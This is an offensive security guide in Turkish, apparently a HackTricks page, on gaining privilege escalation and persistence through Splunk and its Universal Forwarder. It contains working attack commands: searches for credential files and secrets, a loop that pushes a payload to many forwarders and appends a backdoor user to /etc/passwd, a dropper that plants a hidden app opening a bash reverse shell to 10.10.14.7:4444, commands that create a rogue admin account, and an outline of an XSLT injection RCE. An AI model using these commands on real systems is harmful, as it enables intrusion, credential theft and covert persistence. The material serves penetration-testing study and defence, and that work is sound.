# Splunk LPE ve Persistence

Bir makineyi **dahili** veya **harici** olarak **enumerating** ederken **Splunk çalışıyor** durumdaysa (web UI için genellikle **8000**, management API için **8089**), geçerli kimlik bilgileri çoğu zaman app installation, scripted inputs veya management actions aracılığıyla **code execution** elde etmek için kullanılabilir.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Splunk **root** olarak çalışıyorsa bu durum sıklıkla anında **privilege escalation** sağlar.<sup>[[1]](#references)</sup>

Yalnızca genel remote attack surface, enumeration veya app-upload RCE yoluna ihtiyacınız varsa şuraya bakın:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

**Zaten root** iseniz ve Splunk yalnızca localhost üzerinde dinleme yapmıyorsa, **Splunk password hashes** çalabilir, **encrypted secrets** kurtarabilir veya yerel olarak ya da birden fazla forwarder genelinde persistence sağlamak için **malicious app** gönderebilirsiniz.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## İlginç Yerel Dosyalar

Splunk veya Splunk Universal Forwarder çalıştıran bir host'a eriştiğinizde, genellikle en ilgi çekici yollar şunlardır:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Önemli artifact'ler:

- **`$SPLUNK_HOME/etc/passwd`**: yerel Splunk kullanıcıları ve password hash'leri.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: Splunk tarafından çeşitli `.conf` dosyalarında depolanan secret'ları encrypt etmek için kullanılan key.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: başlangıç admin bootstrap dosyası; gold image'larda ve provisioning hatalarında kullanışlıdır. `etc/passwd` zaten mevcutsa yok sayılır.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: scripted input'ların yaygın olarak etkinleştirildiği yer.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** veya **`$SPLUNK_HOME/etc/apps/`**: persistent bir app'i gizlemek veya halihazırda dağıtılanları incelemek için iyi konumlardır.<sup>[[11]](#references)</sup>

## Splunk Universal Forwarder Agent Exploit Summary

Daha fazla ayrıntı için [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) adresini inceleyin. Bu yalnızca bir özettir.<sup>[[1]](#references)</sup>

**Exploit overview:**
Splunk Universal Forwarder'ı (UF) hedefleyen bir exploit, **agent password** bilgisine sahip saldırganların agent'ı çalıştıran sistemlerde arbitrary code execute etmesine ve potansiyel olarak environment'ın büyük bir bölümünü compromise etmesine olanak tanır.<sup>[[1]](#references)</sup>

**Why it works:**

- UF management service çoğunlukla **TCP 8089** üzerinde expose edilir.<sup>[[6]](#references)</sup>
- Saldırganlar API'ye authenticate olabilir ve forwarder'a **malicious app bundle** yüklemesini söyleyebilir.<sup>[[1]](#references)[[5]](#references)</sup>
- Aynı primitive yerel olarak **LPE**, uzaktan ise **RCE** için kullanılabilir.<sup>[[5]](#references)</sup>
- **SplunkWhisperer2** gibi public tooling, app bundle'ı otomatik olarak oluşturur ve Linux target'ları için payload'ları uyarlayabilir.<sup>[[5]](#references)</sup>

**Common ways to recover the password:**

- Documentation, script'ler, share'ler veya deployment automation içindeki cleartext credentials.<sup>[[1]](#references)</sup>
- `$SPLUNK_HOME/etc/passwd` içindeki password hash'leri ve ardından offline cracking.<sup>[[1]](#references)[[7]](#references)</sup>
- `user-seed.conf` gibi gold image'lar veya provisioning artıkları.<sup>[[1]](#references)[[9]](#references)</sup>

**Impact:**

- Her compromise edilmiş host üzerinde SYSTEM/root-level code execution.<sup>[[1]](#references)</sup>
- Persistent app'lerin, backdoor'ların veya ransomware'in deployment'ı.<sup>[[1]](#references)</sup>
- Telemetry'nin data forward edilmeden önce devre dışı bırakılması veya kurcalanması.<sup>[[1]](#references)</sup>

**Example command for exploitation:**

Original report, bir payload'ı birden fazla forwarder'a göndermek için aşağıdaki loop'u gösterir.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Kullanılabilir public exploit'ler:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs veya Malicious Apps ile Persistence

`root`/`splunk` olarak **filesystem write access**'iniz veya app yüklemek için authenticated access'iniz varsa, çok güvenilir bir persistence mekanizması **scripted input** içeren bir **custom app** bırakmaktır.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> Splunk'ın kendi dokümantasyonu, scripted input'ların bir app directory altında bulunmasını ve `inputs.conf` üzerinden etkinleştirilmesini bekler.<sup>[[10]](#references)</sup>

Tipik yerleşim:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
Minimal `inputs.conf`:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Hızlı Linux dropper (belgelenmiş app layout kullanılarak):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notlar:

- Aynı trick, `/opt/splunkforwarder/etc/apps/` kullanılarak **Universal Forwarder** üzerinde de çalışır.<sup>[[2]](#references)[[10]](#references)</sup>
- Attackers, açıkça malicious bir app oluşturmak yerine meşru bir add-on'ı değiştirerek genellikle araya karışır.<sup>[[2]](#references)</sup>
- Bir **deployment server** üzerinde, `deployment-apps/` içine malicious bir app yerleştirmek **fleet-wide persistence** hâline gelir; çünkü forwarder'lar güncellenmiş app'leri sorgular, indirir ve uygulamak için çoğu zaman yeniden başlatılır.<sup>[[11]](#references)[[12]](#references)</sup>

## Credential Theft and Admin Takeover

Splunk'ın yerel dosyalarını okuyabiliyorsanız genellikle iki iyi hedef vardır: **Splunk admin erişimini** ve **şifrelenmiş servis kimlik bilgilerini** kurtarmak.<sup>[[8]](#references)</sup>

### Password hashes and local users

Splunk, yerel authentication verilerini `etc/passwd` içinde saklar. Deployment'a bağlı olarak bu dosyayı crack etmek, web UI ve management API için çalışan kimlik bilgilerini kurtarabilir.<sup>[[1]](#references)[[7]](#references)</sup>

Geçerli **admin** kimlik bilgilerine zaten sahipseniz ve Splunk **native** authentication backend'ini kullanıyorsa, CLI'nin kendisi persistence için kullanılabilir.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` ve şifrelenmiş değerler

Splunk, birden fazla yapılandırma dosyasında depolanan hassas değerleri korumak için `etc/auth/splunk.secret` dosyasını kullanır. Hem **secret** değerini hem de ilgili **`.conf` dosyalarını** çalabilirseniz, genellikle şunları kurtarabilir veya yeniden kullanabilirsiniz:<sup>[[8]](#references)</sup>

- `pass4SymmKey` gibi forwarder/indexer ortak secret değerleri
- `sslPassword` gibi TLS private-key parolaları
- `bindDNPassword` gibi LDAP bind kimlik bilgileri

Bu, Splunk admin parolasının kendisi crack edilemese bile **lateral movement** gerçekleştirmeyi destekleyebilir.<sup>[[8]](#references)</sup>

### `user-seed.conf` dosyasını kötüye kullanma

`user-seed.conf` yalnızca ilk başlatma sırasında veya `etc/passwd` mevcut olmadığında kullanılır. Bu nedenle çalışan bir sistemde daha az kullanışlıdır; ancak şu durumlarda oldukça ilgi çekicidir:<sup>[[9]](#references)</sup>

- ele geçirilmiş installation template'leri
- container image'ları
- unattended provisioning workflow'ları
- Splunk'ın otomatik olarak yeniden başlatıldığı appliance'lar

Bu durumlarda, `splunk hash-passwd` ile oluşturulmuş bir `HASHED_PASSWORD` yerleştirmek, redeployment sonrasında admin erişimini fark edilmeden yeniden kazanmanızı sağlar.<sup>[[9]](#references)</sup>

## Splunk Queries'yi Kötüye Kullanma

Daha fazla ayrıntı için [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) adresine bakın.<sup>[[3]](#references)[[4]](#references)</sup>

Yakın zamanda kullanılan etkili bir teknik, savunmasız Splunk Enterprise sürümlerinde **user-supplied XSLT** özelliğini kötüye kullanarak düşük yetkili ve kimliği doğrulanmış bir hesabı `splunk` kullanıcısı olarak **OS command execution** gerçekleştirebilir hâle getirmektir.<sup>[[3]](#references)[[4]](#references)</sup>

Yüksek seviyeli akış:<sup>[[3]](#references)[[4]](#references)</sup>

1. Splunk üzerinde kimlik doğrulaması yapın.
2. Preview/upload işlevi aracılığıyla kötü amaçlı bir **XSL** dosyası yükleyin.
3. Splunk'ın search sonuçlarını, **dispatch** dizininden yüklenen bu stylesheet ile render etmesini sağlayın.
4. XSLT payload'ını kullanarak bir dosya yazın veya Splunk'ın search pipeline'ı üzerinden execution tetikleyin (örneğin `runshellscript` gibi internal functionality'ye ulaşarak).

Saldırı açısından önemli çıkarım, bu yöntemin **app upload gerektirmeyen post-auth RCE** sağlamasıdır. Linux üzerinde genellikle **`splunk`** hesabına erişim elde edilir; bu yine de değerlidir, çünkü bu kullanıcı çoğu zaman application tree'nin sahibidir, secret'ları okuyabilir ve shell erişimi kaybedilse bile ayakta kalan persistent app'ler yerleştirebilir.<sup>[[3]](#references)[[4]](#references)</sup>

Exploitation sırasında kullanılan örnek bir path şöyledir:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Splunk çok fazla ayrıcalıkla çalışıyorsa veya `splunk` kullanıcısının tehlikeli script'lere, yazılabilir service unit'lerine ya da hatalı `sudo` kurallarına erişimi varsa bu, kolayca bir **LPE** zincirine dönüşür.

## References

- [1] [RCE ve Persistence İçin Splunk Forwarder'larını Kötüye Kullanma](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [TraitorWare'e Dikkat: Persistence İçin Splunk Kullanma](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analizi: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Varsayılan değerleri değiştirme](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Birden fazla sunucuda güvenli parolalar dağıtma](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Scripted input ayarlama](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Deployment app'leri oluşturma](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Deployment güncellemelerinin nasıl gerçekleştiği](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [CLI ile kullanıcıları yapılandırma](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
